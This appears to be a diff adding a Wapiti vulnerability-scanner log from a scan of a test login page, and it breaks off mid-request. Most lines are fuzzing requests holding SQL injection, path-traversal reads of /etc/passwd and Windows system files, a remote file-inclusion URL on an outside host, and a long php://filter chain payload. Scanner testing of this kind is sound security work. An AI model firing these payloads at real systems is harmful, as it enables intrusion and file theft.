@@ -1,0 +1,869 @@
+2024-03-20 14:24:12.578 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:12.718 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:12.719 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:12.818 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 14:24:12.819 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_282faf48.db
+2024-03-20 14:24:12.821 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 14:24:12.852 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 14:24:12.853 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 14:24:12.879 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 14:24:12.969 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 14:24:12.969 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 14:24:12.990 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:12.990 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 14:24:12.990 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 14:24:13.029 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 14:24:13.092 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 14:24:13.104 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:13.114 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 14:24:13.114 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 14:24:13.162 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 14:24:13.163 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 14:24:13.237 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 14:24:13.289 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 14:24:13.301 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:13.309 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 14:24:13.394 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 14:24:13.405 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:13.427 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:13.427 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%C2%BF%27%22%28&password=fuzz
+2024-03-20 14:24:13.435 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%C2%BF%27%22%28
+2024-03-20 14:24:13.453 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%20AND%2067%3D155%20AND%2028%3D28&password=fuzz
+2024-03-20 14:24:13.467 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%27%20AND%2099%3D154%20AND%20%2725%27%3D%2725&password=fuzz
+2024-03-20 14:24:13.483 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%22%20AND%2025%3D46%20AND%20%2253%22%3D%2253&password=fuzz
+2024-03-20 14:24:13.498 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%29%20AND%2069%3D140%20AND%20%2847%3D47&password=fuzz
+2024-03-20 14:24:13.514 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%27%29%20AND%2098%3D172%20AND%20%28%2741%27%3D%2741&password=fuzz
+2024-03-20 14:24:13.526 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%27%29%20AND%2023%3D49%20AND%20%28%2785%27%3D%2785&password=fuzz
+2024-03-20 14:24:13.536 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%27%29%20AND%2011%3D11%20AND%20%28%2755%27%3D%2755&password=fuzz
+2024-03-20 14:24:13.549 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%22%29%20AND%2030%3D121%20AND%20%28%2252%22%3D%2252&password=fuzz
+2024-03-20 14:24:13.570 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%20AND%2083%3D122%20AND%2040%3D40
+2024-03-20 14:24:13.599 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%27%20AND%2034%3D106%20AND%20%2772%27%3D%2772
+2024-03-20 14:24:13.613 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%22%20AND%2084%3D183%20AND%20%2219%22%3D%2219
+2024-03-20 14:24:13.627 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%29%20AND%2095%3D136%20AND%20%2898%3D98
+2024-03-20 14:24:13.639 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%27%29%20AND%2078%3D150%20AND%20%28%2772%27%3D%2772
+2024-03-20 14:24:13.654 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz%22%29%20AND%2059%3D69%20AND%20%28%2215%22%3D%2215
+2024-03-20 14:24:13.684 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_
+2024-03-20 14:24:13.685 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%C2%BF%27%22%28&password=Letm3in_
+2024-03-20 14:24:13.695 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=alice%C2%BF%27%22%28
+2024-03-20 14:24:13.727 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%20AND%2047%3D63%20AND%2052%3D52&password=Letm3in_
+2024-03-20 14:24:13.749 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%27%20AND%2098%3D197%20AND%20%2794%27%3D%2794&password=Letm3in_
+2024-03-20 14:24:13.777 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%22%20AND%2044%3D85%20AND%20%2287%22%3D%2287&password=Letm3in_
+2024-03-20 14:24:13.795 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%29%20AND%2085%3D96%20AND%20%2828%3D28&password=Letm3in_
+2024-03-20 14:24:13.809 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%27%29%20AND%2014%3D70%20AND%20%28%2713%27%3D%2713&password=Letm3in_
+2024-03-20 14:24:13.817 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%27%29%20AND%2060%3D159%20AND%20%28%2758%27%3D%2758&password=Letm3in_
+2024-03-20 14:24:13.826 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%27%29%20AND%2042%3D42%20AND%20%28%2774%27%3D%2774&password=Letm3in_
+2024-03-20 14:24:13.835 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice%22%29%20AND%2029%3D48%20AND%20%28%2263%22%3D%2263&password=Letm3in_
+2024-03-20 14:24:13.848 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%20AND%2047%3D79%20AND%2061%3D61
+2024-03-20 14:24:13.862 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%27%20AND%2053%3D120%20AND%20%2783%27%3D%2783
+2024-03-20 14:24:13.877 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%22%20AND%2074%3D117%20AND%20%2272%22%3D%2272
+2024-03-20 14:24:13.893 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%29%20AND%2034%3D121%20AND%20%2822%3D22
+2024-03-20 14:24:13.906 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%27%29%20AND%2086%3D98%20AND%20%28%2785%27%3D%2785
+2024-03-20 14:24:13.925 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/users/login.php (1)
+	data: username=alice&password=Letm3in_%22%29%20AND%2035%3D91%20AND%20%28%2259%22%3D%2259
+2024-03-20 14:24:13.966 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 14:24:13.980 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/users/login.php (1)
+2024-03-20 14:24:13.989 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/users/login.php (0)
+	data: username=fuzz&password=fuzz
+2024-03-20 14:24:13.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&password=fuzz
+2024-03-20 14:24:14.001 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&password=fuzz
+2024-03-20 14:24:14.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.017 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.047 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&password=fuzz
+2024-03-20 14:24:14.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&password=fuzz
+2024-03-20 14:24:14.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&password=fuzz
+2024-03-20 14:24:14.079 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.097 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&password=fuzz
+2024-03-20 14:24:14.108 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&password=fuzz
+2024-03-20 14:24:14.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&password=fuzz
+2024-03-20 14:24:14.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.153 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.163 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.195 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.215 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.228 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.240 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.251 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.263 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&password=fuzz
+2024-03-20 14:24:14.274 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.285 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.308 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.318 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.330 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.342 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.362 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.372 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&password=fuzz
+2024-03-20 14:24:14.378 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.388 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&password=fuzz
+2024-03-20 14:24:14.398 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.410 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&password=fuzz
+2024-03-20 14:24:14.421 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
+	data: username=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&password=fuzz
+2024-03-20 14:24:14.432 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/users/login.php (0)
